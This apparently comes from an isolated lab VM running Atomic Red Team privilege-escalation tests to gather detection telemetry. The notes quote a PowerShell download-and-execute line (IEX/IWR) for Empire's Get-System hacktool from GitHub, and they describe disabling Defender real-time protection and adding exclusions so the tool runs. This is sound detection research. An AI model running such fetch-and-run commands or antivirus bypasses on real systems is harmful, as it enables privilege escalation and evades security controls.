# VM3 setup notes

Facts recorded while building and running VM3 ([VM3-RUNBOOK.md](VM3-RUNBOOK.md)), for the outcome
section of [docs/design/vm3-session.md](../../docs/design/vm3-session.md). Filled in as the session
proceeds; empty until then.

## Machine

- Base: **full clone of `CPES-Windows11-Lab12` @ `vm-live-v1-ready`** (2026-10-29). VM `CPES-Windows11-VM3`,
  user `cpeslab` ("CPES Lab"). Host-only IP **192.168.56.103**; USB off; clipboard and drag-and-drop disabled.
- Sysmon running, config hash `B58F8F5B…2373E2C8` (same v2 config). Audit *Security System Extension* = Success.
- Elasticsearch 9.4.3: the clone ran it by hand, so it was **installed as an auto-start Windows service** here
  (`elasticsearch-service-x64`) with a 2 GB heap cap (`jvm.options.d\heap.options`). Winlogbeat 9.4.3 repointed to
  index **`cpes-live-vm3`** (`winlogbeat setup --pipelines --index-management`, service restarted). The clone's old
  `cpes-live-v1` index stays on disk and is untouched (export reads `cpes-live-vm3` by time range).
- Preflight: **26 OK**, every UAC binary present including **`sdclt.exe`** and all ten test prerequisites; the only
  FAIL is "no internet route", which is expected while the setup NAT adapter is still on (clears in freeze).

## Token-offline shim

- Both T1134.001 tests run `IEX (IWR '<raw url>'); Get-System -Technique ...`. URL fetched and pinned during setup:
  `https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1`
  (26,498 chars), SHA-256 **`678ADADA054703A176940399C9CFB3EAA050C2FFDBAB8365CD60B6B714A99F22`**.
- `token-offline-profile.ps1` installed as `$PSHOME\Profile.ps1` with that pin; it serves the one URL from the local
  copy and passes every other request through. **`CPES-TokenScriptOk` = True** at freeze.
- **Defender notes.** Get-System.ps1 is a flagged hacktool: real-time protection quarantines it in-flight even with a
  folder exclusion, so during setup RT was turned off only for the fetch, `C:\CPES-session` was added to Defender
  exclusions (as `C:\AtomicRedTeam` already is), and RT was turned back **on** for the benign period
  (RealTimeProtectionEnabled = True at freeze). A guard bug in the first shim (setup's text-replace of the sentinel
  hit the guard check too, inverting it) was fixed before freeze: the guard now checks the pin length, not the
  sentinel literal.

## Pilot (throwaway)

- One round of ten tests, Defender off, `pilot-atomic-log.csv`. `python -m evaluation.vm3 --pilot` result: _TBD_.
- Any test that did not escalate, and what was done about it (amendment / fixed and re-piloted): _TBD_.
- Reverted to `vm3-ready` after the pilot: _TBD_.

## Recorded session

- Benign period: _TBD_. Defender off at: _TBD_ (state in `defender-state-before-attacks.csv`).
- Part 1 (uac) / Part 2 (admin): _TBD_. Exit codes: _TBD_. Defender detections: _TBD_.
- Export: `lab/export_live.py --name vm3 --start … --end …` → _N_ documents, SHA-256 _TBD_
  (set `vm3.CORPUS_SHA256`).

## Analysis

- `python -m evaluation.run vm3` execution id, commit, verdicts: _TBD_.
- Any disclosed correction: _TBD_.
